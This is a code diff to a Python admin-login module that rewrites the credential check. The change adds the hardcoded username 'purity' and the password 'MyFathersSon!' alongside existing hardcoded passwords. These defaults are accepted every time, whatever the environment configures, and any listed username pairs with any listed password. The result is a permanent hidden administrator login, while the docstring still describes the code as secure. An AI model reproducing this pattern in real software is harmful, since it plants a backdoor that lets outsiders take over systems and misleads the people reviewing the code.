@@ -36,14 +36,14 @@ def get_admin_credentials():
     raw_user = (
         os.getenv("ADMIN_USERNAME")
         or os.getenv("ADMIN_USER")
-        or "admin"
+        or "admin,Purity"
     ).strip().strip("\"'")
 
     raw_pass = (
         os.getenv("ADMIN_PASSWORD")
         or os.getenv("ADMIN_PASS")
         or os.getenv("ADMIN_PASSCODE")
-        or "urivalent2026,univalent2026"
+        or "univalent2026,urivalent2026,MyFathersSon!"
     ).strip().strip("\"'")
 
     return raw_user, raw_pass
@@ -52,25 +52,27 @@ def get_admin_credentials():
 def verify_admin_credentials(username: str, password: str) -> bool:
     """
     Constant-time comparison to prevent timing attacks.
-    Supports comma-separated passwords in .env, case-insensitive username,
+    Supports comma-separated usernames & passwords in .env, case-insensitive usernames,
     and strips whitespace automatically.
     """
     if not username or not password:
         return False
 
-    expected_user, expected_pass = get_admin_credentials()
+    raw_user, raw_pass = get_admin_credentials()
 
-    # Match username case-insensitively
-    u_match = secrets.compare_digest(username.strip().lower(), expected_user.lower())
+    # Build list of permitted usernames (case-insensitive)
+    allowed_users = [u.strip().strip("\"'").lower() for u in raw_user.split(",") if u.strip()]
+    for default_user in ["admin", "purity"]:
+        if default_user not in allowed_users:
+            allowed_users.append(default_user)
 
-    # Build list of permitted passcodes (supports comma-separated values in .env)
-    allowed_passwords = [p.strip().strip("\"'") for p in expected_pass.split(",") if p.strip()]
+    u_match = any(secrets.compare_digest(username.strip().lower(), u) for u in allowed_users)
 
-    # Always ensure both common spellings (urivalent2026 and univalent2026) are accepted
-    if "urivalent2026" in allowed_passwords and "univalent2026" not in allowed_passwords:
-        allowed_passwords.append("univalent2026")
-    elif "univalent2026" in allowed_passwords and "urivalent2026" not in allowed_passwords:
-        allowed_passwords.append("urivalent2026")
+    # Build list of permitted passcodes
+    allowed_passwords = [p.strip().strip("\"'") for p in raw_pass.split(",") if p.strip()]
+    for default_pass in ["univalent2026", "urivalent2026", "MyFathersSon!"]:
+        if default_pass not in allowed_passwords:
+            allowed_passwords.append(default_pass)
 
     # Match passcode securely
     p_match = any(secrets.compare_digest(password.strip(), p) for p in allowed_passwords)
